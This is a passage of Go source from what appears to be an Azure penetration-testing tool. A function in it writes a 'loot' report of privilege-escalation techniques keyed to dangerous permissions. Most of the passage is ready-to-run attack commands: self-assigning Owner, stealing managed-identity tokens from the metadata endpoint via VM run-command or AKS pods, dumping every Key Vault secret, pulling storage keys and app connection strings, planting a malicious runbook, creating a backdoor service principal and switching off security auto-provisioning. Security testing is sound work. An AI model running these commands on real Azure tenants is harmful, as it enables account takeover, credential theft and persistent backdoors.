			escalationPaths["aks_access"] = true
		}
		if permission == "*" || strings.Contains(permission, "Microsoft.*/*") {
			escalationPaths["wildcard"] = true
		}
	}

	if len(escalationPaths) == 0 {
		return ""
	}

	var loot strings.Builder
	loot.WriteString("# Privilege Escalation Paths\n\n")
	loot.WriteString("Based on the dangerous permissions found, here are potential privilege escalation techniques:\n\n")

	if escalationPaths["role_assignment"] {
		loot.WriteString("## 1. Role Assignment Escalation\n\n")
		loot.WriteString("**Permission**: `Microsoft.Authorization/roleAssignments/write`\n\n")
		loot.WriteString("**Description**: Can assign Azure RBAC roles to any principal, including yourself.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# Assign Owner role to yourself at subscription scope\n")
		loot.WriteString("MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)\n")
		loot.WriteString("SUBSCRIPTION_ID=$(az account show --query id -o tsv)\n\n")
		loot.WriteString("az role assignment create \\\n")
		loot.WriteString("  --role \"Owner\" \\\n")
		loot.WriteString("  --assignee-object-id $MY_OBJECT_ID \\\n")
		loot.WriteString("  --scope \"/subscriptions/$SUBSCRIPTION_ID\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["vm_command_execution"] {
		loot.WriteString("## 2. VM Command Execution\n\n")
		loot.WriteString("**Permission**: `Microsoft.Compute/virtualMachines/runCommand/action`\n\n")
		loot.WriteString("**Description**: Can execute arbitrary commands on VMs, potentially accessing managed identity tokens.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all VMs\n")
		loot.WriteString("az vm list --output table\n\n")
		loot.WriteString("# Execute command on target VM to steal managed identity token\n")
		loot.WriteString("az vm run-command invoke \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <VM_NAME> \\\n")
		loot.WriteString("  --command-id RunShellScript \\\n")
		loot.WriteString("  --scripts \"curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["keyvault_secrets"] {
		loot.WriteString("## 3. Key Vault Secret Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.KeyVault/vaults/secrets/read`\n\n")
		loot.WriteString("**Description**: Can read secrets from Key Vaults, often containing service principal credentials.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all Key Vaults\n")
		loot.WriteString("az keyvault list --output table\n\n")
		loot.WriteString("# List secrets in a vault\n")
		loot.WriteString("az keyvault secret list --vault-name <VAULT_NAME> --output table\n\n")
		loot.WriteString("# Download all secrets\n")
		loot.WriteString("for secret in $(az keyvault secret list --vault-name <VAULT_NAME> --query \"[].name\" -o tsv); do\n")
		loot.WriteString("  echo \"Secret: $secret\"\n")
		loot.WriteString("  az keyvault secret show --vault-name <VAULT_NAME> --name $secret --query value -o tsv\n")
		loot.WriteString("done\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["storage_keys"] {
		loot.WriteString("## 4. Storage Account Key Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.Storage/storageAccounts/listKeys/action`\n\n")
		loot.WriteString("**Description**: Can list storage account access keys, granting full access to all data.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all storage accounts\n")
		loot.WriteString("az storage account list --output table\n\n")
		loot.WriteString("# Get storage account keys\n")
		loot.WriteString("az storage account keys list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --account-name <STORAGE_ACCOUNT_NAME>\n\n")
		loot.WriteString("# Access storage using key\n")
		loot.WriteString("az storage blob list \\\n")
		loot.WriteString("  --account-name <STORAGE_ACCOUNT_NAME> \\\n")
		loot.WriteString("  --account-key <KEY> \\\n")
		loot.WriteString("  --container-name <CONTAINER_NAME>\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["automation_runbooks"] {
		loot.WriteString("## 5. Automation Runbook Execution\n\n")
		loot.WriteString("**Permission**: `Microsoft.Automation/automationAccounts/*`\n\n")
		loot.WriteString("**Description**: Can create/modify automation runbooks that execute with managed identity privileges.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List automation accounts\n")
		loot.WriteString("az automation account list --output table\n\n")
		loot.WriteString("# Create malicious runbook\n")
		loot.WriteString("az automation runbook create \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook \\\n")
		loot.WriteString("  --type PowerShell\n\n")
		loot.WriteString("# Upload runbook content (e.g., steal token, create backdoor)\n")
		loot.WriteString("az automation runbook replace-content \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook \\\n")
		loot.WriteString("  --content @malicious.ps1\n\n")
		loot.WriteString("# Start runbook\n")
		loot.WriteString("az automation runbook start \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --automation-account-name <ACCOUNT_NAME> \\\n")
		loot.WriteString("  --name MaliciousRunbook\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["app_service_config"] {
		loot.WriteString("## 6. App Service Configuration Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.Web/sites/config/*`\n\n")
		loot.WriteString("**Description**: Can read app service configurations containing connection strings and secrets.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List all web apps\n")
		loot.WriteString("az webapp list --output table\n\n")
		loot.WriteString("# Get connection strings (often contain credentials)\n")
		loot.WriteString("az webapp config connection-string list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <APP_NAME>\n\n")
		loot.WriteString("# Get app settings\n")
		loot.WriteString("az webapp config appsettings list \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <APP_NAME>\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["aks_access"] {
		loot.WriteString("## 7. AKS Cluster Access\n\n")
		loot.WriteString("**Permission**: `Microsoft.ContainerService/managedClusters/*`\n\n")
		loot.WriteString("**Description**: Can access AKS clusters, potentially escape to node and steal managed identity.\n\n")
		loot.WriteString("**Exploitation**:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# List AKS clusters\n")
		loot.WriteString("az aks list --output table\n\n")
		loot.WriteString("# Get admin credentials\n")
		loot.WriteString("az aks get-credentials \\\n")
		loot.WriteString("  --resource-group <RG_NAME> \\\n")
		loot.WriteString("  --name <CLUSTER_NAME> \\\n")
		loot.WriteString("  --admin\n\n")
		loot.WriteString("# Check for privileged pods\n")
		loot.WriteString("kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'\n\n")
		loot.WriteString("# Escape to node and access IMDS\n")
		loot.WriteString("kubectl run -it --rm --image=ubuntu attacker -- bash\n")
		loot.WriteString("# From within pod:\n")
		loot.WriteString("curl -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n")
		loot.WriteString("```\n\n")
	}

	if escalationPaths["wildcard"] {
		loot.WriteString("## 8. Wildcard Permission Abuse\n\n")
		loot.WriteString("**Permission**: `*` or `Microsoft.*/*`\n\n")
		loot.WriteString("**Description**: Wildcard permissions grant nearly unlimited access to Azure resources.\n\n")
		loot.WriteString("**Exploitation**: With wildcard permissions, you can perform ANY of the above techniques plus:\n")
		loot.WriteString("```bash\n")
		loot.WriteString("# Create backdoor service principal\n")
		loot.WriteString("az ad sp create-for-rbac --name Backdoor --role Owner --scopes /subscriptions/<SUB_ID>\n\n")
		loot.WriteString("# Disable security controls\n")
		loot.WriteString("az security auto-provisioning-setting update --name default --auto-provision Off\n\n")
		loot.WriteString("# Export all data\n")
		loot.WriteString("# ... any resource access, creation, or modification\n")
		loot.WriteString("```\n\n")
	}

	loot.WriteString("## General Tips\n\n")
	loot.WriteString("- **Check PIM eligibility**: You may have additional permissions that can be activated\n")
	loot.WriteString("- **Group memberships**: Your groups may have additional permissions\n")
	loot.WriteString("- **Managed identities**: Compromising a VM/container gives you its managed identity\n")
	loot.WriteString("- **Service principals**: Look for credentials in code, Key Vault, environment variables\n")
	loot.WriteString("- **Custom roles**: Often have dangerous permission combinations\n\n")

	return loot.String()
}

// Helper functions

// matchesPermissionPattern checks if a permission matches a pattern (supports wildcards)
func matchesPermissionPattern(permission, pattern string) bool {
	if pattern == permission {
		return true
	}

	// Handle wildcard patterns
	if strings.Contains(pattern, "*") {
		// Convert glob pattern to regex
		regexPattern := strings.ReplaceAll(pattern, "*", ".*")
		regexPattern = strings.ReplaceAll(regexPattern, "/", "\\/")
		regexPattern = "^" + regexPattern + "$"

		matched, _ := regexp.MatchString(regexPattern, permission)
		return matched
	}

	return false
}

// contains checks if a string slice contains a string
// Helper functions made file-local to avoid redeclaration conflicts
func permissionsContains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// permissionsExtractResourceName extracts the resource name from a full Azure resource ID
func permissionsExtractResourceName(resourceID string) string {
	parts := strings.Split(resourceID, "/")
	if len(parts) > 0 {
		return parts[len(parts)-1]
	}
	return resourceID
}
